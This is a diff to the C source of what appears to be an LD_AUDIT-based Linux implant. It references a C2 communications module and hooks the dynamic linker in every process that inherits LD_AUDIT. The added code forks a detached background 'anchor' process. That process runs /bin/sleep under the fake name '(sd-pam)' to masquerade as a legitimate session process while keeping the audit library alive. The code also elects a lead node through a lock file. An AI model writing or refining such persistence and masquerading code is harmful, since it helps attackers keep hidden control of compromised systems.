@@ -24,7 +24,6 @@
  * ============================================================================
  */
 
-#define _GNU_SOURCE
 #include "../c2_comms/crypto.h"
 #include "../common/config.h"
 #include "../common/logging.h"
@@ -41,6 +40,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/file.h> /* flock */
+#include <sys/stat.h>
 #include <sys/mman.h>
 #include <sys/socket.h>
 #include <sys/un.h>
@@ -74,6 +74,45 @@ static aegis_hook_entry_t g_hooks[MAX_HOOKS];
 static int g_hook_count = 0;
 static pthread_mutex_t g_hook_mutex = PTHREAD_MUTEX_INITIALIZER;
 
+/* ── Internal: Hydra Anchor Spawning ─────────────────────────────────────── */
+
+extern char **environ;
+
+static void spawn_anchor_process(void) {
+  pid_t pid = fork();
+  if (pid < 0)
+    return;
+  if (pid > 0)
+    return; /* Parent returns */
+
+  /* Child: detach and become the Anchor */
+  setsid();
+
+  /* Mark ourselves as the Anchor */
+  setenv("AEGIS_ANCHOR", "1", 1);
+
+  /* Close standard FDs to detach from terminal */
+  int devnull = open("/dev/null", O_RDWR);
+  if (devnull >= 0) {
+    dup2(devnull, 0);
+    dup2(devnull, 1);
+    dup2(devnull, 2);
+    if (devnull > 2)
+      close(devnull);
+  }
+
+  /*
+   * masquerade as a legitimate session process (sd-pam).
+   * We use /bin/sleep infinity to stay alive with minimal resource usage.
+   * LD_AUDIT is inherited from environ.
+   */
+  char *argv[] = {"(sd-pam)", "infinity", NULL};
+  execve("/bin/sleep", argv, environ);
+
+  /* If execve fails, exit */
+  exit(0);
+}
+
 /* ── Internal: Node Election via flock ───────────────────────────────────── */
 
 static aegis_node_type_t elect_node(void) {
@@ -86,7 +125,7 @@ static aegis_node_type_t elect_node(void) {
 
   /* Create the lock file's parent directory */
   char lock_dir[512];
-  strncpy(lock_dir, lock_path, sizeof(lock_dir) - 1);
+  snprintf(lock_dir, sizeof(lock_dir), "%s", lock_path);
   char *slash = strrchr(lock_dir, '/');
   if (slash) {
     *slash = '\0';
@@ -103,14 +142,38 @@ static aegis_node_type_t elect_node(void) {
    * All others = Beta nodes.
    */
   if (flock(g_lock_fd, LOCK_EX | LOCK_NB) == 0) {
-    /* We got the lock — we are the Alpha */
-    /* Write our PID to the lock file for identification */
-    char pid_str[32];
-    int n = snprintf(pid_str, sizeof(pid_str), "%d\n", (int)getpid());
-    ftruncate(g_lock_fd, 0);
-    lseek(g_lock_fd, 0, SEEK_SET);
-    write(g_lock_fd, pid_str, n);
-    return NODE_ALPHA;
+    /* We acquired the lock. Check if we are the designated Anchor. */
+    const char *is_anchor = getenv("AEGIS_ANCHOR");
+
+    if (is_anchor && strcmp(is_anchor, "1") == 0) {
+      /* We are the Anchor — proceed as Alpha */
+      char pid_str[32];
+      int n = snprintf(pid_str, sizeof(pid_str), "%d\n", (int)getpid());
+      if (ftruncate(g_lock_fd, 0) == 0) {
+        lseek(g_lock_fd, 0, SEEK_SET);
+        if (write(g_lock_fd, pid_str, n) != n) {
+          /* Ignored write error */
+        }
+      }
+
+      /* Clear the env var so children don't inherit it blindly */
+      unsetenv("AEGIS_ANCHOR");
+
+      return NODE_ALPHA;
+    } else {
+      /*
+       * We are a transient process (e.g. ls, bash).
+       * Pass the torch to a dedicated background Anchor.
+       */
+      spawn_anchor_process();
+
+      /* Release the lock and downgrade to Beta */
+      flock(g_lock_fd, LOCK_UN);
+      close(g_lock_fd);
+      g_lock_fd = -1;
+
+      return NODE_BETA;
+    }
   }
 
   /* Lock failed — we are a Beta node */
@@ -212,6 +275,7 @@ static void auditor_cleanup(void) {
  * we support (LAV_CURRENT) and receive a pointer to the audit cookie.
  */
 unsigned int la_version(unsigned int version) {
+  (void)version;
   /*
    * Trigger one-time initialization on the very first la_version call.
    * This happens before any shared object is loaded, giving us
@@ -230,6 +294,7 @@ unsigned int la_version(unsigned int version) {
  *   LA_FLG_BINDFROM — audit symbol bindings FROM this object
  */
 unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie) {
+  (void)cookie;
   if (!g_initialized || !g_log)
     return 0;
 
@@ -268,6 +333,10 @@ unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie) {
 uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx, uintptr_t *refcook,
                        uintptr_t *defcook, unsigned int *flags,
                        const char *symname) {
+  (void)ndx;
+  (void)refcook;
+  (void)defcook;
+  (void)flags;
   if (!g_initialized || !symname)
     return sym->st_value;
 
@@ -307,6 +376,7 @@ uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx, uintptr_t *refcook,
  * requires all libraries to be present.
  */
 void la_preinit(uintptr_t *cookie) {
+  (void)cookie;
   if (!g_initialized)
     return;
 
@@ -321,6 +391,7 @@ void la_preinit(uintptr_t *cookie) {
  * flag values: LA_ACT_CONSISTENT, LA_ACT_ADD, LA_ACT_DELETE
  */
 void la_activity(uintptr_t *cookie, unsigned int flag) {
+  (void)cookie;
   if (!g_initialized || !g_log)
     return;
 
